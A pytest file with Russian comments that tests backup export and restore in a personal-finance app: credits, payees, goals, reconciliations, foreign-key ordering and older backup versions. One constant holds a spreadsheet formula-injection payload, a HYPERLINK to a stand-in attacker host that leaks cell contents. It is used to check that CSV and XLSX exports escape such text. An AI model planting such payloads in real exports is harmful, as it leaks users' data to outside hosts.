"""Бэкап и восстановление на настоящей базе: ничего не теряется.

Первая версия бэкапа не знала о кредитах, получателях, целях и
сверках. После восстановления платежи по кредиту висели без самого
кредита — ни поправить, ни удалить, а долг пропадал из капитала.

Здесь выгружается аккаунт со всем, что появилось позже, и
восстанавливается в другой. Проверяются не только количества, но и
то, что каждая ссылка ведёт на запись нового владельца, а не на
старую.
"""

import io
import uuid
from datetime import UTC, date, datetime
from decimal import Decimal
from typing import Any, cast

import pytest
from openpyxl import load_workbook
from sqlalchemy import event, select
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine

from app.core.enums import AccountType, CategoryKind, GoalKind, TransactionKind
from app.core.exceptions import AlreadyExistsError, ValidationFailedError
from app.core.models import Base
from app.domains.accounts.models import Account
from app.domains.auth.models import User
from app.domains.budgets.models import Budget
from app.domains.categories.models import Category
from app.domains.credits.models import Credit, CreditPayment
from app.domains.currencies.models import Currency
from app.domains.export.repository import SqlExportRepository
from app.domains.export.service import BACKUP_VERSION, ExportService
from app.domains.goals.models import CategoryGoal
from app.domains.import_.repository import SqlImportRepository
from app.domains.import_.service import ImportService
from app.domains.payees.models import Payee, PayeeCandidate
from app.domains.reconciliation.models import Reconciliation
from app.domains.transactions.models import Transaction, Transfer

WHEN = datetime(2026, 9, 10, 12, 0, tzinfo=UTC)


def _tx(
    ledger: dict[str, uuid.UUID],
    kind: TransactionKind,
    amount: str,
    **extra: Any,
) -> Transaction:
    value = Decimal(amount)
    return Transaction(
        user_id=ledger["user"],
        account_id=ledger["rub"],
        kind=kind,
        amount=value,
        currency_code="RUB",
        amount_rub=value,
        exchange_rate=Decimal(1),
        date=WHEN,
        **extra,
    )


async def _fill(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    """Аккаунт со всем, чего не знала первая версия бэкапа."""
    user = ledger["user"]
    food = Category(user_id=user, name="Еда", kind=CategoryKind.EXPENSE)
    db_session.add(food)
    await db_session.flush()
    groceries = Category(
        user_id=user,
        name="Продукты",
        kind=CategoryKind.EXPENSE,
        parent_id=food.id,
    )
    interest = Category(
        user_id=user, name="Проценты", kind=CategoryKind.EXPENSE
    )
    db_session.add_all([groceries, interest])
    await db_session.flush()

    shop = Payee(
        user_id=user,
        name="Пятёрочка",
        name_key="пятерочка",
        last_category_id=groceries.id,
    )
    market = Payee(
        user_id=user, name="Ozon", name_key="ozon", varied_categories=True
    )
    # Разобранный мусор: отклонённое имя и ещё одно, что ждёт решения.
    # Даты передаём явно: у колонок только server_default, и без них
    # после flush обращение к полю в async-сессии даёт MissingGreenlet.
    db_session.add_all(
        [
            shop,
            market,
            PayeeCandidate(
                user_id=user,
                name="TAKSOPOLIS",
                name_key="taksopolis",
                status="rejected",
                times_seen=3,
                first_seen_at=WHEN,
                last_seen_at=WHEN,
            ),
            PayeeCandidate(
                user_id=user,
                name="Новая лавка",
                name_key="новая лавка",
                status="pending",
                times_seen=1,
                first_seen_at=WHEN,
                last_seen_at=WHEN,
            ),
        ]
    )
    await db_session.flush()

    purchase = _tx(
        ledger,
        TransactionKind.EXPENSE,
        "-540",
        category_id=groceries.id,
        payee_id=shop.id,
        payee_name_snapshot="Пятёрочка",
        category_name_snapshot="Еда",
        subcategory_name_snapshot="Продукты",
        reconciled_at=WHEN,
    )
    credit_leg = _tx(ledger, TransactionKind.CREDIT_PAYMENT, "-11980")
    adjustment = _tx(ledger, TransactionKind.ADJUSTMENT, "-200")
    db_session.add_all([purchase, credit_leg, adjustment])
    await db_session.flush()

    credit = Credit(
        user_id=user,
        name="Т-Банк Кредит",
        currency_code="RUB",
        principal_initial=Decimal("430000"),
        principal_balance=Decimal("423126.99"),
        monthly_payment=Decimal("11980"),
        payment_day=1,
        linked_account_id=ledger["rub"],
    )
    db_session.add(credit)
    await db_session.flush()

    db_session.add_all(
        [
            CreditPayment(
                user_id=user,
                credit_id=credit.id,
                payment_account_id=ledger["rub"],
                transaction_id=credit_leg.id,
                date=WHEN,
                total_amount=Decimal("11980"),
                principal_amount=Decimal("6873.01"),
                interest_amount=Decimal("5106.99"),
                fee_amount=Decimal(0),
                currency_code="RUB",
                interest_category_id=interest.id,
            ),
            CategoryGoal(
                user_id=user,
                category_id=groceries.id,
                kind=GoalKind.BY_DATE,
                amount=Decimal("60000"),
                target_date=date(2026, 12, 1),
            ),
            Reconciliation(
                user_id=user,
                account_id=ledger["rub"],
                date=WHEN,
                statement_balance=Decimal("-12720"),
                computed_balance=Decimal("-12520"),
                adjustment_transaction_id=adjustment.id,
            ),
        ]
    )
    await db_session.flush()


async def _second_user(db_session: AsyncSession) -> uuid.UUID:
    user = User(
        email=f"restore-{uuid.uuid4()}@example.com", hashed_password="x"
    )
    db_session.add(user)
    await db_session.flush()
    return user.id


def _service(db_session: AsyncSession) -> ImportService:
    # Сервис операций нужен только массовому импорту, не восстановлению.
    return ImportService(SqlImportRepository(db_session), cast(Any, None))


async def test_backup_carries_everything_added_after_version_one(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _fill(db_session, ledger)
    bundle = await ExportService(SqlExportRepository(db_session)).build_backup(
        ledger["user"]
    )

    assert bundle.version == BACKUP_VERSION == 3
    assert len(bundle.credits) == 1
    assert len(bundle.credit_payments) == 1
    assert len(bundle.payees) == 2
    assert {(c.name, c.status) for c in bundle.payee_candidates} == {
        ("TAKSOPOLIS", "rejected"),
        ("Новая лавка", "pending"),
    }
    assert len(bundle.goals) == 1
    assert len(bundle.reconciliations) == 1
    purchase = next(t for t in bundle.transactions if t.payee_id is not None)
    assert purchase.payee_name_snapshot == "Пятёрочка"
    assert purchase.reconciled_at is not None


async def test_restore_rebuilds_every_link_for_the_new_owner(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _fill(db_session, ledger)
    bundle = await ExportService(SqlExportRepository(db_session)).build_backup(
        ledger["user"]
    )
    owner = await _second_user(db_session)

    result = await _service(db_session).restore_all(owner, bundle)
    assert result.credits == 1
    assert result.credit_payments == 1
    assert result.payees == 2
    assert result.payee_candidates == 2
    assert result.goals == 1
    assert result.reconciliations == 1

    async def one(model: Any) -> Any:
        rows = (
            (
                await db_session.execute(
                    select(model).where(model.user_id == owner)
                )
            )
            .scalars()
            .all()
        )
        return rows

    own_tx = {t.id: t for t in await one(Transaction)}
    own_categories = {c.id: c for c in await one(Category)}

    # Кредит и платёж: платёж ссылается на операцию нового владельца
    # и на его же категорию процентов, а не на старые записи.
    [credit] = await one(Credit)
    assert credit.principal_balance == Decimal("423126.99")
    [payment] = await one(CreditPayment)
    assert payment.credit_id == credit.id
    assert payment.transaction_id in own_tx
    assert (
        own_tx[payment.transaction_id].kind == TransactionKind.CREDIT_PAYMENT
    )
    assert own_categories[payment.interest_category_id].name == "Проценты"

    # Получатели: память о категории ведёт в новое дерево, отметка
    # «разные категории» у маркетплейса сохранилась.
    payees = {p.name: p for p in await one(Payee)}
    assert payees["Ozon"].varied_categories is True
    shop = payees["Пятёрочка"]
    assert own_categories[shop.last_category_id].name == "Продукты"

    # Кандидаты: отклонённое имя осталось отклонённым — иначе
    # разобранный мусор после восстановления всплыл бы в очереди снова.
    candidates = {c.name: c for c in await one(PayeeCandidate)}
    assert candidates["TAKSOPOLIS"].status == "rejected"
    assert candidates["TAKSOPOLIS"].times_seen == 3
    assert candidates["TAKSOPOLIS"].first_seen_at is not None
    assert candidates["Новая лавка"].status == "pending"

    # Операция: получатель, подписи и отметка сверки на месте.
    purchase = next(t for t in own_tx.values() if t.payee_id is not None)
    assert purchase.payee_id == shop.id
    assert purchase.payee_name_snapshot == "Пятёрочка"
    assert purchase.subcategory_name_snapshot == "Продукты"
    assert purchase.reconciled_at is not None

    # Цель и сверка.
    [goal] = await one(CategoryGoal)
    assert own_categories[goal.category_id].name == "Продукты"
    [reconciliation] = await one(Reconciliation)
    assert reconciliation.adjustment_transaction_id in own_tx


async def test_restore_respects_foreign_keys() -> None:
    """Восстановление на базе, которая проверяет внешние ключи.

    Общая фикстура — SQLite без проверки ключей, и на ней бюджет,
    вставленный раньше своей категории, проходил. На PostgreSQL то же
    восстановление падало. Здесь ключи включены, как на проде.
    """
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")

    @event.listens_for(engine.sync_engine, "connect")
    def _foreign_keys(dbapi_conn: Any, _: Any) -> None:
        dbapi_conn.execute("PRAGMA foreign_keys=ON")

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    try:
        async with AsyncSession(engine, expire_on_commit=False) as session:
            session.add(Currency(code="RUB", name="Рубль", decimals=2))
            user = User(email="fk-owner@example.com", hashed_password="x")
            session.add(user)
            await session.flush()
            rub = Account(
                user_id=user.id,
                name="Альфа",
                type=AccountType.CARD,
                currency_code="RUB",
            )
            session.add(rub)
            await session.flush()
            ledger = {"user": user.id, "rub": rub.id}
            await _fill(session, ledger)
            food = await session.scalar(
                select(Category).where(
                    Category.user_id == user.id, Category.name == "Продукты"
                )
            )
            assert food is not None
            # Бюджет и перевод — то, что раньше вставлялось не в том
            # порядке: Budget раньше Category, Transaction раньше Transfer.
            session.add(
                Budget(
                    user_id=user.id,
                    month=date(2026, 9, 1),
                    category_id=food.id,
                    planned=Decimal("15000"),
                )
            )
            transfer = Transfer(user_id=user.id)
            session.add(transfer)
            await session.flush()
            session.add(
                _tx(
                    ledger,
                    TransactionKind.TRANSFER,
                    "-1000",
                    transfer_id=transfer.id,
                )
            )
            await session.flush()

            bundle = await ExportService(
                SqlExportRepository(session)
            ).build_backup(user.id)
            owner = await _second_user(session)

            result = await _service(session).restore_all(owner, bundle)

            assert result.budgets == 1
            assert result.transfers == 1
    finally:
        await engine.dispose()


async def test_restore_refuses_an_account_that_already_has_goals(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    """Восстановление удаляет категории, а цели держатся на них
    каскадом — без этой проверки они исчезли бы молча."""
    await _fill(db_session, ledger)
    bundle = await ExportService(SqlExportRepository(db_session)).build_backup(
        ledger["user"]
    )
    owner = await _second_user(db_session)
    category = Category(
        user_id=owner, name="Отпуск", kind=CategoryKind.EXPENSE
    )
    db_session.add(category)
    await db_session.flush()
    db_session.add(
        CategoryGoal(
            user_id=owner,
            category_id=category.id,
            kind=GoalKind.MONTHLY,
            amount=Decimal("1000"),
        )
    )
    await db_session.flush()

    with pytest.raises(AlreadyExistsError):
        await _service(db_session).restore_all(owner, bundle)


TRAP = '=HYPERLINK("https://evil.example/?d="&A2,"чек")'


async def _trap(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    db_session.add(
        _tx(
            ledger,
            TransactionKind.EXPENSE,
            "-100",
            comment=TRAP,
            payee_name_snapshot="+79991234567",
        )
    )
    await db_session.flush()


async def test_csv_does_not_turn_text_into_formulas(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _trap(db_session, ledger)

    csv_text = await ExportService(
        SqlExportRepository(db_session)
    ).transactions_csv(ledger["user"], None, None)

    assert "'" + TRAP.replace('"', '""') in csv_text
    assert "'+79991234567" in csv_text
    # Суммы — числа, их не трогаем.
    assert "'-100" not in csv_text


async def test_xlsx_keeps_formula_like_text_as_text(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _trap(db_session, ledger)

    raw = await ExportService(
        SqlExportRepository(db_session)
    ).transactions_xlsx(ledger["user"], None, None)

    sheet = load_workbook(io.BytesIO(raw)).active
    assert sheet is not None
    cells = [c for row in sheet.iter_rows(min_row=2) for c in row]
    trap = next(c for c in cells if c.value == TRAP)
    assert trap.data_type == "s"
    assert not any(c.data_type == "f" for c in cells)


async def test_csv_names_the_payee_and_the_full_category_path(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _fill(db_session, ledger)
    csv_text = await ExportService(
        SqlExportRepository(db_session)
    ).transactions_csv(ledger["user"], None, None)

    header = csv_text.splitlines()[0]
    assert "Получатель" in header
    assert "Еда → Продукты" in csv_text
    assert "Пятёрочка" in csv_text


async def test_version_two_backup_restores_with_no_candidates(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    """Бэкап версии 2 кандидатов не знал: восстанавливается без них."""
    await _fill(db_session, ledger)
    bundle = await ExportService(SqlExportRepository(db_session)).build_backup(
        ledger["user"]
    )
    payload = bundle.model_dump(mode="json")
    payload["version"] = 2
    del payload["payee_candidates"]
    old = type(bundle).model_validate(payload)
    assert old.payee_candidates == []
    owner = await _second_user(db_session)

    result = await _service(db_session).restore_all(owner, old)

    assert result.payees == 2
    assert result.payee_candidates == 0
    rows = (
        (
            await db_session.execute(
                select(PayeeCandidate).where(PayeeCandidate.user_id == owner)
            )
        )
        .scalars()
        .all()
    )
    assert rows == []


async def test_restore_refuses_duplicate_candidate_names(
    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
) -> None:
    await _fill(db_session, ledger)
    bundle = await ExportService(SqlExportRepository(db_session)).build_backup(
        ledger["user"]
    )
    bundle.payee_candidates.append(bundle.payee_candidates[0].model_copy())
    owner = await _second_user(db_session)

    with pytest.raises(ValidationFailedError):
        await _service(db_session).restore_all(owner, bundle)
